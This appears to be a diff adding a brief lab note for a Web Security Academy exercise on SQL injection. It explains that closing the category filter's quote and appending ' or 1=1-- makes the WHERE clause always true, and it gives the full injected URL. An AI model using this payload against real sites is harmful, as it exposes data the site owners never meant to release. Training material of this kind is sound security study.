@@ -1,0 +1,5 @@
+here we are escaping the where clauce and adding 1=1 which will always be true thus returning all the items
+
+https://acf21f951f267a2780901e6f00b90029.web-security-academy.net/filter?category=' or 1=1--
+
+
